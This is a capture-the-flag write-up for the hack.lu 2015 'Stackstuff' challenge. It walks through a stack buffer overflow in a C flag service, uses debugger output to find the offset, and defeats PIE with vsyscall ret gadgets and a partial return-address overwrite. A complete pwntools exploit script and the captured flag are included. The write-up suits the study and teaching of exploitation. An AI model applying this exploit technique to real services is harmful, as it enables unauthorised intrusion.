[](ctf=hack.lu-2015)
[](type=exploiting,pwn)
[](tags=buffer-overflow)
[](tools=gdb-peda,pwntools)
[](techniques=ROP)

# Stackstuff (Exploiting 150)
We have an [archive](../stackstuff_public_d7f6e7f394f649ba96b3113374a0bfb3.tar.gz).
On extracting

```bash
$ file *
hackme:   ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f46fbf9b159f6a1a31893faf7f771ca186a2ce8d, not stripped
hackme.c: C source, ASCII text
```

We have source of the executable. 

```c
int check_password_correct(void) {
  char buf[50] = {0};

  puts("To download the flag, you need to specify a password.");
  printf("Length of password: ");
  int inlen = 0;
  if (scanf("%d\n", &inlen) != 1) {
    // peer probably disconnected?
    exit(0);
  }
  if (inlen <= 0 || inlen > 50) {
    // bad input length, fix it
    inlen = 90;
  }
  if (fread(buf, 1, inlen, stdin) != inlen) {
    // peer disconnected, stop
    exit(0);
  }
  return strcmp(buf, real_password) == 0;
}


void require_auth(void) {
  while (!check_password_correct()) {
    puts("bad password, try again");
  }
}

void handle_request(void) {
  alarm(60);
  setbuf(stdout, NULL);

  FILE *realpw_file = fopen("password", "r");
  if (realpw_file == NULL || fgets(real_password, sizeof(real_password), realpw_file) == NULL) {
    fputs("unable to read real_password\n", stderr);
    exit(0);
  }
  fclose(realpw_file);

  puts("Hi! This is the flag download service.");
  require_auth();

  char flag[50]; //we'll jump to this line in the exploit ;)
  FILE *flagfile = fopen("flag", "r");
  if (flagfile == NULL || fgets(flag, sizeof(flag), flagfile) == NULL) {
    fputs("unable to read flag\n", stderr);
    exit(0);
  }
  puts(flag);
}

```
We can see that it is basic buffer overflow in check_password_correct as it allows an input of length 90 in a buffer of 50.
So we load the executable in gdb.
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : disabled
```
NX is enabled means stack is not executable.
PIE means position independent executable, This means that the binary instructions itself is loaded arbitrarily in the memory.
So we can't have shellcode and normal ROP over the binary.

However we have an attack vector where we can fool the service to jump to the part where it displays the flag. But we need to have knowledge of the eip or some instruction address in memory.

So lets find the offset of EIP overwrite and search for some attack vectors.
Use pattern_create and pattern_offset to find that the offset is 72.

So payload:
> 'A'*72+ret_addr


Lets test in gdb. For PIE enabled executables gdb uses a fixed address to load them which can be found out by running and stopping it in gdb using 'info files'

```bash
$ nc 127.0.0.1 1514 -vv
localhost [127.0.0.1] 1514 (?) open
Hi! This is the flag download service.
To download the flag, you need to specify a password.
Length of password: 99
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB
```
gives us

```bash
gdb-peda$  b *0x555555554fb9
Breakpoint 1 at 0x555555554fb9
gdb-peda$ r
.
.
.
[Switching to process 2398]
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0xa ('\n')
RDX: 0x73 ('s')
RSI: 0x555555755a20 ("sudhackar\n")
RDI: 0x7fffffffe0d0 ('A' <repeats 72 times>, 'B' <repeats 18 times>, "UUUU")
RBP: 0x0 
RSP: 0x7fffffffe118 ('B' <repeats 18 times>, "UUUU")
RIP: 0x555555554fb9 (<check_password_correct+231>:	ret)
R8 : 0x1000 
R9 : 0x4141414141414141 ('AAAAAAAA')
R10: 0x4141414141414141 ('AAAAAAAA')
R11: 0x246 
R12: 0x555555554d70 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe2c0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554faf <check_password_correct+221>:	sete   al
   0x555555554fb2 <check_password_correct+224>:	movzx  eax,al
   0x555555554fb5 <check_password_correct+227>:	add    rsp,0x58
=> 0x555555554fb9 <check_password_correct+231>:	ret    
   0x555555554fba <require_auth>:	sub    rsp,0x8
   0x555555554fbe <require_auth+4>:	jmp    0x555555554fcc <require_auth+18>
   0x555555554fc0 <require_auth+6>:	lea    rdi,[rip+0x420]        # 0x5555555553e7
   0x555555554fc7 <require_auth+13>:	call   0x555555554bc0 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe118 ('B' <repeats 18 times>, "UUUU")
0008| 0x7fffffffe120 ("BBBBBBBBBBUUUU")
0016| 0x7fffffffe128 --> 0x555555554242 ('BBUUUU')
0024| 0x7fffffffe130 --> 0x555555554d70 (<_start>:	xor    ebp,ebp)
0032| 0x7fffffffe138 --> 0x7ffff7df0325 (<_dl_runtime_resolve+53>:	mov    r11,rax)
0040| 0x7fffffffe140 --> 0x7fffffffe57f --> 0x5800636578656572 ('reexec')
0048| 0x7fffffffe148 --> 0x0 
0056| 0x7fffffffe150 --> 0x7fffffffe2d8 --> 0x7fffffffe586 ("XDG_VTNR=7")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555554fb9 in check_password_correct ()
```

So we have EIP overwrite here. But we can't figure out the ret_addr. 
However If we notice the stack frame here on ret instruction above.
We see 
```
0016| 0x7fffffffe128 --> 0x555555554242 ('BBUUUU')
```
We control the last two bytes of an address which matches with our randomised EIP. So now we have to use this address some how to return to this location.


We can use the linux vsyscall function as its location is always fixed for a binary.
The vsyscalls are part of the kernel, but the kernel pages containing them are executable with userspace privileges. And they’re mapped to fixed addresses in the virtual memory

Now we'll look for potential ROP chains.

```bash
gdb-peda$ x/5xi 0xffffffffff600400
   0xffffffffff600400:	mov    rax,0xc9
   0xffffffffff600407:	syscall 
   0xffffffffff600409:	ret    
   0xffffffffff60040a:	int3   
   0xffffffffff60040b:	int3
```
Yea, ret is all we need,twice!
So now payload format :

>'A'*72+p64(0xffffffffff600400)+p64(0xffffffffff600400)+last two bytes of our jmp address.

[Here](stackstuff.py) is an exploit that does the same.
```python
from pwn import *
#s=remote('127.0.0.1',1514)
#0x000055555555508b
#0xffffffffff600400
s=remote('school.fluxfingers.net',1514)
addr=p64(0xffffffffff600400)
payload='A'*72+addr*2+"\x8b\x10"
print repr(payload)
print s.recv(100,timeout=1)
print s.recv(100,timeout=1)
print s.recv(100,timeout=1)
print s.recv(100,timeout=1)
s.send('100\n')
print s.recvline(timeout=1)
print s.recvline(timeout=1)
s.send(payload+'\n')
for _ in range(10):
	try:
		print s.recv(100,timeout=1)
	except:
		print "Done?"
		break
```
Afer a few tries

```bash
$ python stackstuff_public_d7f6e7f394f649ba96b3113374a0bfb3/try.py [+] Opening connection to school.fluxfingers.net on port 1514: Done
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x04`\xff\xff\xff\xff\xff\x00\x04`\xff\xff\xff\xff\xff\x8b\x10'
Hi! This is the flag download service.

To download the flag, you need to specify a password.
Length of password: 




flag{MoRE_REtuRnY_tHAn_rop}


Done?
[*] Closed connection to school.fluxfingers.net port 1514
```

Flag: 

> flag{MoRE_REtuRnY_tHAn_rop}